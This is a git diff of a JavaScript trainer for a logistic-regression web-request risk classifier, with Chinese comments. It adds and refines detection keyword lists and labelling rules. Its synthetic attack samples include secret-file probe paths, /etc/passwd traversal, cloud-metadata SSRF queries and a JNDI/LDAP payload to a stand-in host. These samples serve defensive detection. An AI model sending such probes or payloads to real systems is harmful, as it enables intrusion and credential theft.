@@ -1,5 +1,5 @@
 // 轻量请求风险模型训练器 v2（逻辑回归 + 特征哈希）。
-// 训练特征与 csh-api 运行时的 riskMlTokens() 保持完全一致（FEATURE_VERSION=risk-request-v2）。
+// 训练特征与 csh-api 运行时的 riskMlTokens() 保持完全一致（FEATURE_VERSION=risk-request-v3）。
 //
 // v2 相比 v1：
 //   - 特征量化更细：4096 维、20 级长度桶、路径/查询字符构成、UA 长度、Range 起点、qset 等。
@@ -19,11 +19,12 @@ import { fileURLToPath } from 'node:url';
 import { Worker } from 'node:worker_threads';
 import { sigmoid, summarize, bestThreshold, highThreshold, metricsAt } from './risk-metrics.mjs';
 
-export const FEATURE_VERSION = 'risk-request-v2';
+export const FEATURE_VERSION = 'risk-request-v3';
 export const DEFAULT_DIM = 4096;
 const KNOWN_HOSTS = new Set([
   'classsoftwarehub.cn', 'www.classsoftwarehub.cn', 'download.classsoftwarehub.cn',
-  'api.classsoftwarehub.cn', 'submit.132614.xyz', '132614.xyz', 'xfane.com',
+  'gh.classsoftwarehub.cn', 'api.classsoftwarehub.cn', 'docs.classsoftwarehub.cn',
+  'classsoftwarehub.us.ci', 'submit.132614.xyz', '132614.xyz', 'xfane.com',
   '209.33.174.187', '8.159.148.101', '127.0.0.1', 'localhost',
 ]);
 const PATH_KEYWORDS = [
@@ -31,12 +32,10 @@ const PATH_KEYWORDS = [
   'cgi-bin', 'actuator', 'swagger', 'graphql', 'console', 'manager', 'admin', 'login',
   'config', 'backup', 'database', 'dump', 'passwd', 'shadow', 'secret', 'token', 'shell',
   'webshell', 'vendor', 'debug', 'test', 'upload', 'install', 'setup', 'private',
+  '.svn', '.hg', 'phpinfo', 'server-status', 'server-info', '_environment', '_profiler',
 ];
-const STRONG_PATH_KEYWORDS = [
-  '.env', '.git', '.aws', '.ssh', 'wp-admin', 'wp-login', 'xmlrpc.php', 'phpmyadmin',
-  'adminer', 'cgi-bin', 'actuator', 'swagger-ui', 'webshell', 'passwd', 'shadow',
-  'id_rsa', '.ds_store', '/proc/self/', 'server-status', 'heapdump', 'jndi',
-];
+// 点开头的敏感名必须按路径段匹配，否则 github.githubassets / raw.githubusercontent 会被误判。
+const STRONG_PATH_RE = /(?:^|\/)(?:\.env|\.git|\.aws|\.ssh|\.svn|\.hg|\.ds_store)(?:\/|$|\.)|(?:^|\/)proc\/self\/|wp-admin|wp-login|xmlrpc\.php|phpmyadmin|adminer|cgi-bin|actuator|swagger-ui|webshell|passwd|shadow|id_rsa|server-status|heapdump|jndi/;
 // 站点根目录出现这些扩展/备份后缀/指纹词，只可能是扫描器探测（站点本身是静态页 + API）。
 const SITE_PROBE_EXT = /\.(?:php\d?|phtml|asp|aspx|jsp|jspx|cgi|pl|cfm)(?:\.(?:bak|old|save|swp|orig|tmp|txt|zip|tar|gz|sql))?$/i;
 const SITE_PROBE_SUFFIX = /\.(?:bak|old|save|swp|orig|tmp|sql)$/i;
@@ -45,10 +44,17 @@ const SITE_PROBE_WORDS = [
   'ckfinder', 'fckeditor', 'webdav', '/.svn', '/.hg', '/.ds_store', 'web.config',
   'eval-stdin', 'boaform', 'hnap1', 'gponform', 'solr/admin', 'jenkins/script', 'backup', 'dump',
   'keyfile', 'gcp-key', 'gcp-sa', 'service-account', 'credentials.json', 'private-key', 'aws-key',
-  'firebase-key', '/key.json', 'google-key', '/sa.json',
+  'firebase-key', '/key.json', 'google-key', '/sa.json', '_environment', '_profiler',
 ];
 const SENSITIVE_QUERY = ['url', 'file', 'path', 'cmd', 'exec', 'command', 'redirect', 'token', 'key', 'secret', 'password', 'passwd', 'callback', 'next'];
 const ASSET_EXT = new Set(['js', 'css', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'map', 'webp', 'avif']);
+const DL_SHAPES = [
+  [/\/releases\/download\//, 'release'],
+  [/\/releases\/latest\//, 'release'],
+  [/\/archive\/refs\//, 'archive'],
+  [/\/raw\//, 'raw'],
+];
+const OSS_KEY_ROOTS = new Set(['gh-mirror', 'icon', 'upload', 'release', 'releases', 'assets', 'cache']);
 const LEN_EDGES = [0, 4, 8, 12, 16, 24, 32, 48, 64, 96, 128, 192, 256, 384, 512, 768, 1024, 1536, 2048, 3072, 4096];
 const RANGE_START_EDGES = [0, 1048576, 16777216, 268435456, 4294967296];
 
@@ -121,6 +127,8 @@ export function uaClass(ua) {
   }
   return { cls: 'other', vendor: '' };
 }
+// 搜索引擎/GitHub 站内跳转是最常见的正常来路，与陌生外站（常出现在伪造 Referer 的攻击里）分开。
+const WEB_REF_HOSTS = /(^|\.)(google\.[a-z.]+|bing\.com|baidu\.com|duckduckgo\.com|sogou\.com|so\.com|yandex\.[a-z.]+|github\.com|gist\.github\.com)$/;
 function refClass(referer) {
   const s = String(referer || '').trim();
   if (!s) return 'none';
@@ -128,21 +136,11 @@ function refClass(referer) {
     const u = new URL(s);
     if (u.hostname === '127.0.0.1' || u.hostname === 'localhost') return 'local';
     if (KNOWN_HOSTS.has(u.hostname.toLowerCase())) return 'known';
+    if (WEB_REF_HOSTS.test(u.hostname.toLowerCase())) return 'web';
     return 'external';
   } catch { return 'bad'; }
 }
-function acceptClass(accept) {
-  const s = String(accept || '').toLowerCase();
-  if (!s) return 'none';
-  if (s.includes('text/html')) return 'html';
-  if (s.includes('application/json')) return 'json';
-  if (s.includes('image/')) return 'image';
-  if (s.includes('application/octet-stream') || s.includes('application/zip') || s.includes('application/x-')) return 'binary';
-  if (s.includes('text/event-stream')) return 'stream';
-  if (s.includes('text/')) return 'text';
-  if (s.includes('*/*')) return 'any';
-  return 'other';
-}
+
 function rangeClass(range) {
   const s = String(range || '').trim().toLowerCase();
   if (!s) return 'none';
@@ -153,7 +151,8 @@ function rangeClass(range) {
   if (m[1] && !m[2]) return 'open';
   const start = Number(m[1]);
   const end = Number(m[2]);
-  if (Number.isFinite(end) && end - start > 100 * 1024 * 1024) return 'huge';
+  // 跨度大不是恶意：IDM/迅雷等下载器会按几十~上百 MB 切片并发取回。
+  if (Number.isFinite(end) && end - start > 100 * 1024 * 1024) return 'wide';
   return 'single';
 }
 function rangeStart(range) {
@@ -169,7 +168,8 @@ function pathTraits(p) {
   const s = String(p || '');
   const lower = s.toLowerCase();
   const out = [];
-  if (lower.includes('..') || lower.includes('%2e%2e') || lower.includes('%252e')) out.push('traversal');
+  // 只认路径段级的 ..，避免把 compare/a...b 这类正常 URL 当作穿越。
+  if (/(^|\/)\.\.(\/|$)/.test(lower) || lower.includes('%2e%2e') || lower.includes('%252e')) out.push('traversal');
   if (lower.includes('%00') || lower.includes('\0')) out.push('nullbyte');
   if (/\/\//.test(s)) out.push('doubleslash');
   if (lower.includes('${') || lower.includes('jndi')) out.push('jndi');
@@ -191,7 +191,6 @@ export function riskMlTokens(ev) {
   const headers = ev.headers || {};
   const ua = headers['user-agent'] || headers['User-Agent'] || '';
   const referer = headers.referer || headers.Referer || '';
-  const accept = headers.accept || headers.Accept || '';
   const range = headers.range || headers.Range || '';
   const xff = headers['x-forwarded-for'] || headers['X-Forwarded-For'] || '';
   const host = ev.host || headers.host || headers.Host || '';
@@ -211,16 +210,37 @@ export function riskMlTokens(ev) {
   if (ASSET_EXT.has(ext)) tokens.push('passet');
   if (segs.length) tokens.push(`pfirst:${normSeg(segs[0]) || 'empty'}`);
   if (segs.length > 1) tokens.push(`plast:${normSeg(segs[segs.length - 1]) || 'empty'}`);
-  if (segs[0] === 'gh') {
+  // 站点代理有 /gh/<host>/... 与仓库作用域的 /<owner>/gh/<host>/... 两种入口形状。
+  if (segs[0] === 'gh' || (segs[1] === 'gh' && segs.length > 2)) {
+    const at = segs[0] === 'gh' ? 1 : 2;
     tokens.push('pgh');
-    if (segs[1]) tokens.push(`pgh2:${normSeg(segs[1])}`);
-    if (segs[1] === 'api' || segs[1] === 'api.github.com') tokens.push('pghapi');
+    if (segs[at]) tokens.push(`pgh2:${normSeg(segs[at])}`);
+    if (segs[at] === 'api' || segs[at] === 'api.github.com') tokens.push('pghapi');
   }
   if (segs[0] === 'api' && segs[1]) tokens.push(`papi2:${normSeg(segs[1])}`);
-  for (const kw of PATH_KEYWORDS) if (lowerPath.includes(kw)) tokens.push(`pk:${kw}`);
+  for (const kw of PATH_KEYWORDS) {
+    // 点开头的敏感名按整段匹配：github.githubassets 里也含 ".git" 子串。
+    const hit = kw.startsWith('.')
+      ? segs.some((g) => g === kw || g.startsWith(kw + '.'))
+      : lowerPath.includes(kw);
+    if (hit) tokens.push(`pk:${kw}`);
+  }
   for (const t of pathTraits(pathOnly)) tokens.push(`pt:${t}`);
   if (/\/api(\/|$)/.test(lowerPath)) tokens.push('papi');
   if (/\/(login|signin|signup|register|auth)(\/|$)/.test(lowerPath)) tokens.push('pauth');
+  // 下载路径形状：空 UA 的正常发布包/源码下载与“来路不明的抓取”在这类形状上差异最大。
+  if (service === 'download') {
+    const shape = DL_SHAPES.find(([re]) => re.test(lowerPath));
+    tokens.push(`dl:${shape ? shape[1] : 'other'}`);
+  }
+  if (service === 'oss') {
+    // OSS 正常工作流都带对象键或以 ?list 拉清单；裸根路径只会出现在探测鉴权时。
+    // /api/* 是控制面路由（列举/模式切换），不是对象键，okey 只会把正常调用打成高置信。
+    if (segs.length && !lowerPath.startsWith('/api/')) {
+      const root = segs[0].toLowerCase();
+      tokens.push(`okey:${OSS_KEY_ROOTS.has(root) ? root : 'other'}`);
+    }
+  }
   if (segs.length) {
     const last = segs[segs.length - 1];
     if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(last)) tokens.push('puuid');
@@ -229,6 +249,8 @@ export function riskMlTokens(ev) {
     else if (last.startsWith('.')) tokens.push('pdotfile');
     else if (last.length >= 24 && /[a-z]/i.test(last) && /\d/.test(last)) tokens.push('prand');
   }
+  // 隐藏目录（.svn/.hg 等）与 .well-known 的语义不同：前者是源码/版本库泄漏探测。
+  if (segs.length && segs[0].startsWith('.') && !/^\.well-known$/i.test(segs[0])) tokens.push('pdotdir');
 
   let qp = null;
   try { qp = new URLSearchParams(query); } catch {}
@@ -261,13 +283,28 @@ export function riskMlTokens(ev) {
   tokens.push(`qpairs:${countBucket(qpairs)}`);
   if (qpairs > qkeys.length) tokens.push('qdup');
   if (qkeys.length) tokens.push(`qset:${qkeys.slice(0, 4).map(normSeg).filter(Boolean).sort().join('+')}`);
+  // 列举参数：区分后台分页拉取（安全前缀）与越权列举（空/绝对/穿越前缀）。
+  const hasListQ = qkeys.some((k) => k === 'list' || k === 'list-type' || k === 'marker' || k === 'delimiter')
+    || (service === 'oss' && qkeys.includes('prefix'));
+  if (hasListQ) {
+    tokens.push('qlist');
+    const pfx = String(qp ? qp.get('prefix') || '' : '').toLowerCase();
+    const cls = !pfx ? 'none'
+      : pfx.includes('..') ? 'trav'
+      : pfx.startsWith('/') ? 'root'
+      : /^(icon|upload|release|releases|gh-mirror|assets|cache|mirror)\//.test(pfx) ? 'safe'
+      : 'other';
+    tokens.push(`qpfx:${cls}`);
+  }
+  // 既无对象键也无列举参数的 OSS 请求：正常流量不会这样访问。
+  if (service === 'oss' && !segs.length && !hasListQ) tokens.push('osroot');
 
   const uaInfo = uaClass(ua);
   tokens.push(`ua:${uaInfo.cls}`);
   if (uaInfo.vendor) tokens.push(`uav:${uaInfo.vendor}`);
   tokens.push(`ualen:${lenBucket(String(ua).length)}`);
   tokens.push(`ref:${refClass(referer)}`);
-  tokens.push(`accept:${acceptClass(accept)}`);
+  // Accept 不在服务器访问日志里，历史数据恒为空；用它训练只会让扫描面误报，故不作为特征。
   tokens.push(`range:${rangeClass(range)}`);
   const rs = rangeStart(range);
   if (rs) tokens.push(`rstart:${lenBucket(rs, RANGE_START_EDGES)}`);
@@ -324,18 +361,23 @@ function vectorizeSparse(tokens, dim) {
 
 function suspiciousPath(p, service = 'site') {
   let s = String(p || '').toLowerCase();
-  if (s.includes('..') || s.includes('%2e%2e') || s.includes('%252e') || s.includes('%00')) return true;
-  // /gh/ 是 GitHub 全站代理的正常浏览路径，仓库名里出现 admin/vendor 等词不算扫描。
-  if (s.startsWith('/gh/') || s.startsWith('/__csh_internal/')) {
+  if (/(^|\/)\.\.(\/|$)/.test(s) || s.includes('%2e%2e') || s.includes('%252e') || s.includes('%00')) return true;
+  // /gh/ 与仓库作用域的 /<owner>/gh/ 都是 GitHub 全站代理的正常浏览路径，
+  // 仓库名里出现 admin/vendor 等词不算扫描。
+  if (s.startsWith('/gh/') || /^\/[^/]+\/gh\//.test(s) || s.startsWith('/__csh_internal/')) {
     return /\/\.(git|env|aws|ssh|svn|hg)/.test(s) || s.includes('jndi') || /%2e%2e|%00|%252e/.test(s);
   }
+  // 仓库作用域的 <owner>/<repo>.git 是正常 clone/push；根目录 /.git/ 探测仍算恶意。
+  if (/^\/[^/]+\/[^/]+\.git(\/|$)/.test(s)) return false;
   if (service === 'site') {
     if (s === '/admin' || s.startsWith('/admin/')) return true;
-    if (s.startsWith('/.git') || s.startsWith('/.env') || s.startsWith('/.aws') || s.startsWith('/.ssh')) return true;
+    // 根目录隐藏文件/目录（.npmrc/.gitconfig/.docker…）除了 .well-known 都是探测。
+    const first = s.replace(/^\/+/, '').split('/')[0] || '';
+    if (first.startsWith('.') && first !== '.well-known') return true;
     if (SITE_PROBE_EXT.test(s) || SITE_PROBE_SUFFIX.test(s)) return true;
     if (SITE_PROBE_WORDS.some((kw) => s.includes(kw))) return true;
   }
-  return STRONG_PATH_KEYWORDS.some((kw) => s.includes(kw));
+  return STRONG_PATH_RE.test(s);
 }
 function suspiciousQuery(q) {
   const s = String(q || '').toLowerCase();
@@ -363,6 +405,17 @@ export function labelOf(ev) {
   if (suspiciousPath(path, ev.service) || suspiciousQuery(query)) return 1;
   if (ev.service === 'oss' && ev.op === 'auth') return 1; // 无效 API KEY 探测
   if (ev.op === 'auth' && status === 401 && !normalUa) return 1;
+  // 下载 200/206 意味着签名已通过；OSS 200 意味着密钥已通过。
+  // 这类“已授权但 UA 为空”的流量是误报重灾区，直接作为硬负样本。
+  const op = String(ev.op || '').toLowerCase();
+  // /api/* 的 404 既可能是客户端调错，也可能是猜接口；归为不可判定，避免污染两边。
+  if (ev.service === 'site' && status === 404 && path.startsWith('/api/')) return null;
+  if (ev.service === 'download' && (op === 'hotlink' || op === 'range-many')) return 1;
+  if (ev.service === 'download' && (status === 200 || status === 206 || status === 304)) return 0;
+  if (ev.service === 'oss' && status >= 200 && status < 400 && op && op !== 'auth') return 0;
+  if (ev.service === 'oss' && status === 404 && !normalUa) return 1; // 无 UA 猜对象键
+  // 搜索引擎/普通爬虫的正常抓取是 2xx/3xx；只有扫描器 UA 才算恶意。
+  if (ua.cls === 'bot' && [200, 206, 301, 302, 304].includes(status)) return 0;
   if (status >= 200 && status < 500 && normalUa) return 0;
   return null;
 }
@@ -401,10 +454,11 @@ export function eventFromLog(raw, hint = '') {
   let p = '/';
   let q = '';
   if (service === 'site') {
-    p = String(raw.uri || raw.request_uri || '/');
-    const ru = String(raw.request_uri || '');
-    const qi = ru.indexOf('?');
-    if (qi >= 0) q = ru.slice(qi + 1);
+    // uri 是代理改写后的上游路径（/__csh_internal/<host><path>），
+    // 请求侧特征必须取客户端原始 request_uri，否则正常浏览会被当成内部路径。
+    p = String(raw.request_uri || raw.uri || '/');
+    const qi = p.indexOf('?');
+    if (qi >= 0) { q = p.slice(qi + 1); p = p.slice(0, qi); }
   } else if (service === 'oss') {
     p = `/${String(raw.key || raw.file || '')}`;
     const t = String(raw.target || '');
@@ -429,9 +483,20 @@ export function eventFromLog(raw, hint = '') {
     host: headers.host,
     status: Number(raw.status) || 0,
     op: raw.op || '',
-    ip: raw.ip || '',
+    ip: clientIpOf(raw),
   };
 }
+
+/** 镜像/回环日志里 ip 常是 127.0.0.1，真实客户端在 xff 最后一段。 */
+function clientIpOf(raw) {
+  const direct = String(raw.ip || '');
+  if (direct && !isPrivateIp(direct)) return direct;
+  const hops = String(raw.xff || '').split(',').map((s) => s.trim()).filter(Boolean);
+  for (let i = hops.length - 1; i >= 0; i--) if (!isPrivateIp(hops[i])) return hops[i];
+  return '';
+}
+
+const SELF_TEST_IPS = new Set(['1.168.23.29', '1.168.33.69', '112.9.107.88', '112.9.107.253']);
 
 function isPrivateIp(ip) {
   const s = String(ip || '');
@@ -502,7 +567,10 @@ const PROBE_PATHS = [
   '/.svn/entries', '/.DS_Store', '/firebase-adminsdk.json', '/server-info', '/wp-config.php.bak',
   '/backup.zip', '/www.zip', '/db.sql', '/dump.sql', '/.vscode/sftp.json', '/docker-compose.yml',
   '/keyfile.json', '/gcp-key.json', '/gcp-sa.json', '/key.json', '/credentials.json', '/service-account.json',
-  '/aws-key.json', '/private-key.pem',
+  '/aws-key.json', '/private-key.pem', '/v1/.env', '/v2/.env', '/api/.env', '/api/v3/.env', '/api/dev/.env',
+  '/config/.env', '/config/app/.env', '/dev/.env', '/cache/.env', '/k8s/.env', '/test/phpinfo.php',
+  '/dev/phpinfo.php', '/old/phpinfo.php', '/tmp/phpinfo.php', '/public/phpinfo.php', '/htdocs/phpinfo.php',
+  '/.hg/requires', '/.hg/dirstate', '/.svn/wc.db', '/dispatch.asp',
 ];
 const ATTACK_QUERIES = [
   'url=http://169.254.169.254/latest/meta-data/', 'url=http://127.0.0.1:8080/admin', 'file=../../etc/passwd',
@@ -551,22 +619,26 @@ function legitEvent(r) {
   const host = pick(r, HOSTS);
   const ref = chance(r, 0.6) ? (chance(r, 0.8) ? `https://${pick(r, ['classsoftwarehub.cn', 'www.classsoftwarehub.cn'])}/` : '') : '';
   if (service === 'site') {
-    const kind = pick(r, ['home', 'repo', 'release', 'asset', 'api', 'docs']);
+    const kind = pick(r, ['home', 'repo', 'release', 'asset', 'api', 'docs', 'meta', 'meta']);
     let p = '/';
     let q = '';
     if (kind === 'repo') p = `/gh/${pick(r, OWNERS)}/${pick(r, REPOS)}`;
     else if (kind === 'release') p = `/gh/${pick(r, OWNERS)}/${pick(r, REPOS)}/releases/tag/v${randInt(r, 1, 9)}.${randInt(r, 0, 9)}.${randInt(r, 0, 9)}`;
     else if (kind === 'asset') p = `/assets/index-${randHex(r, 8)}.js`;
     else if (kind === 'docs') p = `/docs/${pick(r, ['install', 'usage', 'faq', 'legal/privacy'])}`;
+    else if (kind === 'meta') p = pick(r, ['/opensearch.xml', '/manifest.json', '/site.webmanifest', '/fluidicon.png', '/favicon.ico', '/robots.txt', '/sitemap.xml', '/apple-touch-icon.png', '/android-chrome-192x192.png']);
     else if (kind === 'api') {
       p = pick(r, ['/api/status', '/api/dl-mode', '/api/files', '/api/oss-sign', '/api/sign', '/gh/api.github.com/rate_limit']);
       if (p === '/api/files') q = `source=${pick(r, ['bucket', 'cache'])}&prefix=${pick(r, ['release/', 'icon/', 'gh-mirror/'])}`;
     }
-    const useScript = kind === 'api' || chance(r, 0.15);
+    const useScript = kind === 'api' || (kind !== 'meta' && chance(r, 0.15));
+    const isImg = /\.(png|ico)$/.test(p);
     const headers = {
       'user-agent': useScript ? script : browser,
       referer: ref,
-      accept: kind === 'api' ? 'application/json' : 'text/html,application/xhtml+xml,*/*;q=0.8',
+      accept: kind === 'api' ? 'application/json'
+        : isImg ? 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
+          : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       host,
     };
     if (kind === 'api') headers.authorization = `Bearer ${randHex(r, 40)}`;
@@ -581,13 +653,29 @@ function legitEvent(r) {
       `/${pick(r, OWNERS)}/${pick(r, REPOS)}/raw/${pick(r, BRANCHES)}/${pick(r, FILES)}`,
     ]);
     const range = chance(r, 0.35) ? `bytes=${randInt(r, 0, 50) * 1048576}-${randInt(r, 50, 200) * 1048576}` : '';
-    return { ev: ev('download', 'GET', p, pick(r, [200, 200, 206, 206, 304]), { 'user-agent': chance(r, 0.8) ? browser : script, referer: ref, accept: 'application/octet-stream,*/*', range, host }), y: 0 };
+    // 下载器/包管理器/内嵌代理经常不带 UA；这是最容易被误判为抓取的真实流量。
+    const noUa = chance(r, 0.15);
+    return { ev: ev('download', 'GET', p, pick(r, [200, 200, 206, 206, 304]), { 'user-agent': noUa ? '' : (chance(r, 0.8) ? browser : script), referer: noUa && chance(r, 0.6) ? '' : ref, accept: 'application/octet-stream,*/*', range, host }), y: 0 };
   }
   if (service === 'oss') {
+    // 控制面：Worker 定时拉清单、管理端上传/删除，全部已通过密钥校验。
+    const mode = pick(r, ['download', 'download', 'download', 'list', 'upload', 'delete']);
+    if (mode === 'list') {
+      const p = pick(r, ['/?list', '/?list&prefix=icon/', '/?list&prefix=upload/', '/?list&prefix=gh-mirror/', '/?list&prefix=release/']);
+      return { ev: ev('oss', 'GET', p, 200, { 'user-agent': '', referer: '', accept: '*/*', host: pick(r, ['209.33.174.187', '8.159.148.101']) }, { op: 'list' }), y: 0 };
+    }
+    if (mode === 'upload') {
+      const key = pick(r, [`icon/2026/${String(randInt(r, 1, 12)).padStart(2, '0')}/${randName(r)}.jpg`, `gh-mirror/${randHex(r, 64)}`]);
+      return { ev: ev('oss', 'PUT', `/${key}`, 200, { 'user-agent': 'node-fetch/3.3.2', referer: '', accept: '*/*', 'content-type': 'application/octet-stream', host: pick(r, ['209.33.174.187', '8.159.148.101']) }, { op: 'upload' }), y: 0 };
+    }
+    if (mode === 'delete') {
+      const key = pick(r, [`icon/2026/${String(randInt(r, 1, 12)).padStart(2, '0')}/${randName(r)}.jpg`, `cache/${randHex(r, 40)}`]);
+      return { ev: ev('oss', 'DELETE', `/${key}`, 200, { 'user-agent': 'node-fetch/3.3.2', referer: '', accept: '*/*', host: pick(r, ['209.33.174.187', '8.159.148.101']) }, { op: 'delete' }), y: 0 };
+    }
     const key = chance(r, 0.6) ? `gh-mirror/${randHex(r, 64)}` : `icon/2026/${String(randInt(r, 1, 12)).padStart(2, '0')}/${randName(r)}.jpg`;
     const range = chance(r, 0.2) ? `bytes=${randInt(r, 0, 20) * 1048576}-` : '';
     const accept = pick(r, ['image/*,*/*', '*/*', 'image/*', 'application/octet-stream,*/*']);
-    return { ev: ev('oss', 'GET', `/${key}`, pick(r, [200, 200, 206, 304]), { 'user-agent': chance(r, 0.5) ? '' : script, referer: chance(r, 0.2) ? ref : '', accept, range, host: pick(r, HOSTS) }), y: 0 };
+    return { ev: ev('oss', 'GET', `/${key}`, pick(r, [200, 200, 206, 304]), { 'user-agent': chance(r, 0.5) ? '' : script, referer: chance(r, 0.2) ? ref : '', accept, range, host: pick(r, HOSTS) }, { op: 'download' }), y: 0 };
   }
   const repo = pick(r, REPOS);
   const p = pick(r, [
@@ -619,12 +707,25 @@ function benignDenied(r) {
 function ref0(r) { return chance(r, 0.5) ? 'https://classsoftwarehub.cn/' : ''; }
 
 function attackEvent(r) {
-  const kind = pick(r, ['probe', 'probe', 'traversal', 'ssrf', 'scanner', 'ossList', 'authBrute', 'hotlink', 'range', 'method', 'jndi']);
+  const kind = pick(r, ['probe', 'probe', 'traversal', 'ssrf', 'scanner', 'scannerRoot', 'scannerRoot', 'ossList', 'ossAuth', 'ossAuth', 'authBrute', 'hotlink', 'range', 'method', 'jndi']);
   const host = pick(r, HOSTS);
   const weirdUa = pick(r, SCANNER_UAS);
+  const browser = pick(r, BROWSER_UAS);
   if (kind === 'probe' || kind === 'scanner') {
-    const browser = chance(r, 0.25);
-    return { ev: ev('site', pick(r, ['GET', 'GET', 'POST', 'HEAD']), pick(r, PROBE_PATHS), pick(r, [404, 404, 403, 401, 200, 301]), { 'user-agent': browser ? pick(r, BROWSER_UAS) : weirdUa, referer: '', accept: pick(r, ['*/*', 'text/html', '']), host }), y: 1 };
+    const useBrowser = chance(r, 0.4);
+    // 真实扫描器大多不带 Accept（nginx 日志里为空），合成集必须与之一致。
+    return { ev: ev('site', pick(r, ['GET', 'GET', 'POST', 'HEAD']), pick(r, PROBE_PATHS), pick(r, [404, 404, 403, 401, 200, 301]), { 'user-agent': useBrowser ? browser : weirdUa, referer: '', accept: pick(r, ['', '', '', '*/*', 'text/html']), host }), y: 1 };
+  }
+  if (kind === 'scannerRoot') {
+    // 测绘/扫描器常从根路径或只请求静态资源开始，路径本身看不出异常，只能靠 UA 与请求形状。
+    const p = pick(r, ['/', '/index.html', '/favicon.ico', '/robots.txt', `/assets/${randHex(r, 8)}.js`, `/${randHex(r, 6)}`]);
+    return { ev: ev('site', pick(r, ['GET', 'GET', 'HEAD']), p, pick(r, [400, 403, 404]), { 'user-agent': weirdUa, referer: '', accept: pick(r, ['', '', '*/*', 'text/html']), host }), y: 1 };
+  }
+  if (kind === 'ossAuth') {
+    // OSS 直连鉴权失败：根路径 + 空/脚本/浏览器 UA 试探 API KEY，与正常 ?list 的控制面流量不同。
+    const p = pick(r, ['/', '/', '/', '/', '/?prefix=/', '/?prefix=../']);
+    const ua = pick(r, ['', '', browser, pick(r, SCRIPT_UAS), weirdUa]);
+    return { ev: ev('oss', pick(r, ['GET', 'GET', 'HEAD', 'OPTIONS']), p, 401, { 'user-agent': ua, referer: '', accept: pick(r, ['', '', '*/*']), host }, { op: 'auth' }), y: 1 };
   }
   if (kind === 'traversal') {
     const p = pick(r, ['/gh/../../etc/passwd', '/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd', '/download/%252e%252e%252fetc%252fpasswd', '/assets/..%00/index.js']);
@@ -635,7 +736,7 @@ function attackEvent(r) {
     return { ev: ev('site', 'GET', `${p}?${pick(r, ATTACK_QUERIES)}`, pick(r, [400, 401, 403, 200]), { 'user-agent': pick(r, [...SCRIPT_UAS, ...BROWSER_UAS]), referer: '', accept: 'application/json,*/*', host }), y: 1 };
   }
   if (kind === 'ossList') {
-    const p = pick(r, ['/api/files?source=bucket&all=1&prefix=../', '/api/files?source=bucket&prefix=/', '/ls?max-keys=1000', '/?list-type=2']);
+    const p = pick(r, ['/api/files?source=bucket&all=1&prefix=../', '/api/files?source=bucket&prefix=/', '/ls?max-keys=1000', '/?list-type=2', '/?list&prefix=../', '/?list&prefix=/']);
     return { ev: ev('oss', 'GET', p, pick(r, [401, 403, 200]), { 'user-agent': pick(r, [...SCRIPT_UAS, weirdUa, ...BROWSER_UAS]), referer: '', accept: 'application/json,*/*', host }, { op: chance(r, 0.5) ? 'auth' : '' }), y: 1 };
   }
   if (kind === 'authBrute') {
@@ -657,12 +758,21 @@ function attackEvent(r) {
   return { ev: ev('site', 'GET', `${p}?x=${encodeURIComponent('${jndi:ldap://evil.example.com/a}')}`, pick(r, [400, 404, 200]), { 'user-agent': pick(r, [...SCRIPT_UAS, weirdUa]), referer: '', accept: '*/*', host }), y: 1 };
 }
 
+// 服务器端日志（download/oss/mirror）不记录 Host；合成样本必须同样清空，否则线上推理会多出 host:none 偏移。
+function stripLogHost(s) {
+  if (s && s.ev && s.ev.service !== 'site') {
+    s.ev.host = '';
+    if (s.ev.headers) s.ev.headers.host = '';
+  }
+  return s;
+}
+
 export function syntheticSamples(total, seed = 20261104) {
   const r = mulberry32(seed);
   const out = [];
   for (let i = 0; i < total; i++) {
     const s = i % 4 === 3 ? benignDenied(r) : (i % 2 === 0 ? legitEvent(r) : attackEvent(r));
-    out.push(s);
+    out.push(stripLogHost(s));
   }
   return out;
 }
@@ -689,7 +799,7 @@ function smokeSet() {
     mk('download', 'GET', '/microsoft/vscode/releases/download/v1.95.0/Setup.exe', 200, { 'user-agent': s, referer: 'http://evil.example.com/', accept: '*/*', host: 'download.classsoftwarehub.cn' }, 1),
     mk('site', 'TRACE', '/', 405, { 'user-agent': c, referer: '', accept: '*/*', host: 'classsoftwarehub.cn' }, 1),
     mk('site', 'GET', '/api/files?url=http://169.254.169.254/latest/meta-data/', 400, { 'user-agent': b, referer: '', accept: '*/*', host: 'api.classsoftwarehub.cn' }, 1),
-  ];
+  ].map(stripLogHost);
 }
 
 // ---------------------------------------------------------------------------
@@ -719,6 +829,8 @@ async function loadReal(inputs) {
           try { raw = JSON.parse(line); } catch { continue; }
           const e = eventFromLog(raw, hint);
           if (!e || isPrivateIp(e.ip)) continue;
+          // 自测/巡检流量不参与训练：用户本机渗透测试与 csh-check 健康检查。
+          if (SELF_TEST_IPS.has(e.ip) || String(e.headers['user-agent'] || '').startsWith('csh-check')) continue;
           const y = labelOf(e);
           if (y == null) continue;
           samples.push({ ev: e, y, ts: e.ts, origin: 0 });
@@ -989,6 +1101,7 @@ export async function train({
   workers = os.availableParallelism ? os.availableParallelism() : os.cpus().length,
   realWeight = 2.5,
   maxPerClass = 300000,
+  minThreshold = 0.75,
   seed = 42,
   quick = false,
   log = console.log,
@@ -1025,16 +1138,18 @@ export async function train({
   log(`数据集: n=${meta.n} nnz=${meta.nnz} dim=${dim} 文件=${(fs.statSync(tmp).size / 1024 / 1024).toFixed(1)}MB`);
 
   const rng = mulberry32(seed);
+  // 合成语料占比高：过小的 L2 配合过多 epoch 会记住合成分布的形状，
+  // 在真实测试集上表现为浅路径大量误报，因此收紧到中等正则范围。
   const lrs = [0.04, 0.06, 0.09, 0.13, 0.18, 0.25, 0.35, 0.5];
-  const l2s = [5e-7, 2e-6, 8e-6, 3e-5, 1e-4, 3e-4];
-  const epochs = [8, 12, 16, 20, 26, 34];
-  const boosts = [1, 1.25, 1.6, 2.2];
+  const l2s = [3e-5, 1e-4, 3e-4];
+  const epochs = [8, 12, 16, 20];
+  const boosts = [1, 1.25, 1.6];
   const seen = new Set();
   const candidates = [];
   while (candidates.length < search) {
     const cfg = {
       lr: pick(rng, lrs), l2: pick(rng, l2s), epochs: pick(rng, epochs), posBoost: pick(rng, boosts),
